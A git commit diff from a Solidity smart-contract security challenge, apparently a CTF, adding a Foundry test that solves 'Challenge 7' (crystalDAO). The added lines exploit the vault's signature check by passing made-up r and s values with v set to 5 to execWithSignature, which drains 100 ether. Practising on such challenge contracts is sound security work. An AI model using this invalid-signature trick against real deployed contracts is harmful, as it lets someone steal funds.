41e205efbb61394d90f3ad58eb02271e1fac2a57
Luka Racki <luka@racki.dev>
2023-07-16 19:37:00 +0200

    feat: solve 7

--- test/Challenge7.t.sol
+++ test/Challenge7.t.sol
@@ -4,14 +4,12 @@ pragma solidity ^0.8.0;
 
 import "forge-std/Test.sol";
 import {DaoVaultImplementation, FactoryDao, IDaoVault} from "../src/7_crystalDAO/crystalDAO.sol";
+import {EIP712Upgradeable} from "@openzeppelin-upgradeable/contracts/utils/cryptography/EIP712Upgradeable.sol";
 
 /*////////////////////////////////////////////////////////////
 //          DEFINE ANY NECESSARY CONTRACTS HERE             //
 //    If you need a contract for your hack, define it below //
 ////////////////////////////////////////////////////////////*/
-
-
-
 
 /*////////////////////////////////////////////////////////////
 //                     TEST CONTRACT                        //
@@ -36,9 +34,9 @@ contract Challenge7Test is Test {
         deal(address(vault), 100 ether);
     }
 
-
-    function testHack() public {
+    function testHack() external {
         vm.startPrank(whitehat, whitehat);
+
         /*////////////////////////////////////////////////////
         //               Add your hack below!               //
         //                                                  //
@@ -46,9 +44,13 @@ contract Challenge7Test is Test {
         // forge test --match-contract Challenge7Test -vvvv //
         ////////////////////////////////////////////////////*/
 
+        address target = address(daoManager);
 
+        // use random value for v r and s
+        bytes32 r = keccak256(abi.encodePacked(uint256(1)));
+        bytes32 s = keccak256(abi.encodePacked(uint256(2)));
 
-
+        vault.execWithSignature(5, r, s, target, 100 ether, bytes(""), 100);
         //==================================================//
         vm.stopPrank();
 
